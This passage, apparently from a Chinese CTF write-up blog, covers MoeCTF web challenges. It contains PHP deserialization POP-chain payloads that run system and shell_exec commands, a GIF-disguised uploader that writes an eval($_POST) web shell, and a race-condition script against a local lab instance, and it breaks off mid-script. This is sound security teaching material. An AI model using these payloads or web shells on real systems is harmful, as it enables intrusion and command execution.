class="line">åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ï¼ˆå› ä¸º PersonC æ˜¯ PersonA çš„å±æ€§ï¼‰ã€‚</span><br><span class="line">å†…éƒ¨é€»è¾‘ï¼šè®¾ç½®ä¸€äº›å±æ€§å¹¶è°ƒç”¨ <span class="title function_ invoke__">__invoke</span>()ã€‚</span><br><span class="line">åœ¨è¿™ä¸ªåˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨å®ƒæ¥è¾…åŠ©è®¾ç½®å¯¹è±¡é“¾ï¼šPersonC çš„ <span class="variable">$id</span> è®¾ç½®ä¸ºä¸€ä¸ª Person å¯¹è±¡ï¼ˆå†…åµŒå¦ä¸€ä¸ª Personï¼‰ï¼Œä»¥ä¾¿åœ¨ <span class="title function_ invoke__">__wakeup</span>() ä¸­è§¦å‘ <span class="title function_ invoke__">__invoke</span>() æ¥è°ƒæ•´å±æ€§ï¼ˆè™½ç„¶åœ¨æœ¬é“¾è·¯ä¸­ä¸æ˜¯æ ¸å¿ƒï¼Œä½†éœ€è¦åŒ¹é…åºåˆ—åŒ–ç»“æ„ä»¥ç¡®ä¿ååºåˆ—åŒ–æˆåŠŸï¼‰ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>::<span class="title function_ invoke__">__invoke</span>(<span class="variable">$id</span>)ï¼š</span><br><span class="line">åœ¨ <span class="title function_ invoke__">__wakeup</span>() ä¸­è¢«è°ƒç”¨ï¼Œç”¨äºè®¾ç½®åµŒå¥—å¯¹è±¡çš„å±æ€§ï¼ˆå¦‚ <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>; ç­‰ï¼‰ã€‚</span><br><span class="line">è¿™éƒ¨åˆ†ç¡®ä¿å¯¹è±¡é“¾å®Œæ•´ï¼Œä½†ä¸ç›´æ¥å‚ä¸å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç»•è¿‡ç‚¹ï¼š</span><br><span class="line">æ£€æŸ¥åªé’ˆå¯¹ <span class="variable language_">$this</span>-&gt;age . <span class="variable language_">$this</span>-&gt;nameï¼Œä¸æ£€æŸ¥å‚æ•° <span class="variable">$age</span>ï¼Œæ‰€ä»¥ <span class="string">&quot;cat flag&quot;</span> å¯ä»¥åŒ…å« <span class="string">&quot;flag&quot;</span> è€Œä¸ä¼šè§¦å‘ <span class="keyword">die</span>ã€‚</span><br><span class="line">PersonB::<span class="title function_ invoke__">__set</span>() æœªåœ¨æœ¬åˆ©ç”¨ä¸­ä½¿ç”¨ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ€»ä½“é“¾è·¯ï¼šååºåˆ—åŒ– PersonA â†’ è°ƒç”¨ <span class="title function_ invoke__">__wakeup</span>()ï¼ˆåœ¨ PersonC ä¸Šï¼Œè®¾ç½®åµŒå¥—å±æ€§ï¼‰ â†’ è„šæœ¬ç»“æŸè°ƒç”¨ PersonA::<span class="title function_ invoke__">__destruct</span>() â†’ è°ƒç”¨ PersonC::<span class="title function_ invoke__">__Check</span>(<span class="string">&quot;cat flag&quot;</span>) â†’ ç»•è¿‡æ£€æŸ¥ â†’ è°ƒç”¨ <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag&quot;</span>)ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰æ‰€æœ‰ç±»ï¼ˆç»§æ‰¿å…³ç³»å’Œå±æ€§å¿…é¡»åŒ¹é…åŸä»£ç ï¼Œä»¥ç¡®ä¿åºåˆ—åŒ–æ ¼å¼ä¸€è‡´ï¼‰</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ— éœ€å®ç°æ–¹æ³•ï¼Œåªéœ€ç±»å®šä¹‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æœªä½¿ç”¨ï¼Œä½†å®šä¹‰ä»¥å®Œæ•´</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ— éœ€å®ç°æ–¹æ³•ï¼Œåªéœ€ç±»å®šä¹‰</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºåµŒå¥—å¯¹è±¡é“¾</span></span><br><span class="line"><span class="comment">// æœ€å†…å±‚ï¼šä¸€ä¸ªç©º Person å¯¹è±¡ (P2)</span></span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();  <span class="comment">// æ— å±æ€§è®¾ç½®ï¼Œåºåˆ—åŒ–ä¸º O:6:&quot;Person&quot;:0:&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸­å±‚ï¼šä¸€ä¸ª Person å¯¹è±¡ (P1)ï¼Œå…¶ id = P2</span></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$p1</span>-&gt;id = <span class="variable">$p2</span>;  <span class="comment">// name å’Œ age æœªè®¾ç½®ï¼Œåºåˆ—åŒ–æ—¶ä¸å‡ºç°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PersonC å¯¹è±¡ (PC)</span></span><br><span class="line"><span class="variable">$pc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$pc</span>-&gt;name = <span class="string">&quot;system&quot;</span>;  <span class="comment">// ç”¨äºæœ€ç»ˆè°ƒç”¨ system()</span></span><br><span class="line"><span class="variable">$pc</span>-&gt;id = <span class="variable">$p1</span>;         <span class="comment">// ç”¨äº __wakeup() ä¸­çš„åµŒå¥—è°ƒç”¨</span></span><br><span class="line"><span class="variable">$pc</span>-&gt;age = <span class="string">&quot;&quot;</span>;         <span class="comment">// ç”¨äºç»•è¿‡ __Check() ä¸­çš„ str_contains æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PersonA å¯¹è±¡ (PA)</span></span><br><span class="line"><span class="variable">$pa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$pa</span>-&gt;name = <span class="variable">$pc</span>;       <span class="comment">// destruct æ—¶è°ƒç”¨æ­¤å¯¹è±¡çš„ __Check()</span></span><br><span class="line"><span class="variable">$pa</span>-&gt;id = <span class="string">&quot;__Check&quot;</span>;   <span class="comment">// æ–¹æ³•å</span></span><br><span class="line"><span class="variable">$pa</span>-&gt;age = <span class="string">&quot;cat flag&quot;</span>; <span class="comment">// å‚æ•°ï¼Œä¼ é€’ç»™ system()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ– PersonA å¯¹è±¡</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$pa</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡ºåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆä¸æ‚¨æä¾›çš„ä¸€è‡´ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span> . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;PersonA&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;PersonC&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;__Check&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;cat flag&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="23-ç¬¬åä¹ç« -revenge"><a href="#23-ç¬¬åä¹ç« -revenge" class="headerlink" title="23.ç¬¬åä¹ç« _revenge"></a>23.<strong>ç¬¬åä¹ç« _revenge</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;<span class="comment">//nameè®¾ç½®æˆnew personCå¯¹è±¡</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;<span class="comment">//idå³å‡½æ•°å</span></span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age); name=<span class="keyword">new</span> personC,id=check,age=env</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$age</span> == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;<span class="comment">//è¿™é‡Œ$nameéœ€è¦ä¸ºpersonBå¯¹è±¡è§¦å‘invoke</span></span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);<span class="comment">//__invokeè§¦å‘ç‚¹,</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é“¾å°¾åœ¨personCçš„var_dumpé‡Œ,åœ¨personAä¸­åŠ¨æ€è°ƒç”¨$id($this-&gt;age),personCä¸­$thisæ˜¯ PHP ä¸­æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åµŒå¥—å¯¹è±¡</span></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$pb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$pb</span>-&gt;id = <span class="variable">$p1</span>;</span><br><span class="line"><span class="variable">$pc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$pc</span>-&gt;name = <span class="string">&quot;shell_exec&quot;</span>;  <span class="comment">// é•¿åº¦è‡ªåŠ¨ä¸º 10</span></span><br><span class="line"><span class="variable">$pc</span>-&gt;id = <span class="variable">$pb</span>;</span><br><span class="line"><span class="variable">$pc</span>-&gt;age = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$pa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="variable">$pa</span>-&gt;name = <span class="variable">$pc</span>;</span><br><span class="line"><span class="variable">$pa</span>-&gt;id = <span class="string">&quot;check&quot;</span>;</span><br><span class="line"><span class="variable">$pa</span>-&gt;age = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$pa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span> . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;PersonA&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;PersonC&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;shell_exec&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;PersonB&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;check&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;env&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250826123741833.png" alt="image-20250826123741833"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;832295b9-1e23-6426-dfd4-a7385f5504cf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="24-ç¥ç§˜çš„æ‰‹é•¯-revenge"><a href="#24-ç¥ç§˜çš„æ‰‹é•¯-revenge" class="headerlink" title="24.ç¥ç§˜çš„æ‰‹é•¯_revenge"></a>24.<strong>ç¥ç§˜çš„æ‰‹é•¯_revenge</strong></h3><p>æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wanyanzhou.txté‡Œé¢äº†......ä½†æ˜¯æˆ‘å¿˜è®°å¯†ç æ˜¯å•¥äº†ï¼Œè€Œä¸”ä¸å°å¿ƒæŠŠä¿å­˜å¯†ç çš„æ–‡ä»¶åˆ äº†......</span><br><span class="line"></span><br><span class="line">HDdssï¼šè¿™...åº”è¯¥æœ‰å¤‡ä»½å§ï¼Ÿ</span><br><span class="line"></span><br><span class="line">Kçš‡ï¼šç¡®å®æœ‰</span><br></pre></td></tr></table></figure>

<p>è®¿é—®wanyanzhou.txt.bak,å¾—åˆ°å¯†é’¥,</p>
<p><img src="D:\typora_pic\image-20250826162619117.png" alt="image-20250826162619117"></p>
<p>ç”¨bpæŠ“è¯·æ±‚åŒ…æŠ“ä¸åˆ°,å°†åŸæ¥çš„é¡µé¢æŒ‰ F12 æ‰“å¼€ï¼Œå‘ç°è¢«åè°ƒè¯•äº†</p>
<p>æˆ‘ä»¬å³é”®å·¦ä¾§çš„ shouzhuo.js å‘å¿½ç•¥åˆ—è¡¨æ·»åŠ è„šæœ¬ï¼Œç„¶åç‚¹å³ä¾§çš„ç»§ç»­æ‰§è¡Œè„šæœ¬ï¼Œå³å¯ç»§ç»­è°ƒè¯•ï¼š</p>
<p><img src="D:\typora_pic\image-20250826162804026.png" alt="image-20250826162804026"></p>
<p>ç„¶åç‚¹è®¾ç½®ï¼Œç¦ç”¨ javascript ï¼Œå°†åˆšæ‰çš„ 10000 é•¿åº¦çš„å¯†ç å¤åˆ¶è¿›å»ï¼šå†bpæŠ“åŒ…,æœ€åå‘åˆ°çˆ†ç ´æ¨¡å—é‡å¤äº”ç™¾æ¬¡NULL payloadå³å¯</p>
<p><img src="D:\typora_pic\image-20250826162919848.png" alt="image-20250826162919848"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d3a28e96-b84f-5518-4c0d-c65597fd4712&#125;</span><br></pre></td></tr></table></figure>

<h3 id="25-ç¬¬åäº”ç« -å½’çœŸå…³Â·ç«æ—¶å‡€é­”"><a href="#25-ç¬¬åäº”ç« -å½’çœŸå…³Â·ç«æ—¶å‡€é­”" class="headerlink" title="25.ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”"></a>25.<strong>ç¬¬åäº”ç«  å½’çœŸå…³Â·ç«æ—¶å‡€é­”</strong></h3><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ 1.phpï¼Œåªè¦è®¿é—®å°±ä¼šç”Ÿæˆä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;2.php&quot;</span>,<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>bpæŠ“åŒ…,æ”¹mime,ç„¶åå‘åˆ°çˆ†ç ´æ¨¡å—,ç»§ç»­ç”¨NULL payloadçˆ†ç ´</p>
<p>ç„¶ååœ¨å†™ä¸€ä¸ªè„šæœ¬ä¸€ç›´è®¿é—®1.php</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, requests, time</span><br><span class="line">BASE = <span class="string">&quot;http://127.0.0.1:57743&quot;</span></span><br><span class="line">TARGET = BASE + <span class="string">&quot;/uploads/1.php&quot;</span></span><br><span class="line">THREADS = <span class="number">10</span></span><br><span class="line">TIMEOUT = <span class="number">2</span></span><br><span class="line">stop = threading.Event()</span><br><span class="line">counter = &#123;<span class="string">&quot;req&quot;</span>: <span class="number">0</span>, <span class="string">&quot;hit&quot;</span>: <span class="number">0</span>&#125;</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetcher</span>(<span class="params">idx</span>):</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop.is_set():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>?_=<span class="subst">&#123;<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)&#125;</span>&quot;</span></span><br><span class="line">            r = sess.get(url, timeout=TIMEOUT)</span><br><span class="line">            <span class="keyword">with</span> lock:</span><br><span class="line">                counter[<span class="string">&quot;req&quot;</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">with</span> lock:</span><br><span class="line">                    counter[<span class="string">&quot;hit&quot;</span>] += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[HIT] Thread-<span class="subst">&#123;idx&#125;</span> got 200, len=<span class="subst">&#123;<span class="built_in">len</span>(r.content)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  å‰20å­—èŠ‚:&quot;</span>, r.content[:<span class="number">20</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">reporter</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop.is_set():</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[STAT] total=<span class="subst">&#123;counter[<span class="string">&#x27;req&#x27;</span>]&#125;</span> hits=<span class="subst">&#123;counter[<span class="string">&#x27;hit&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"> <span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 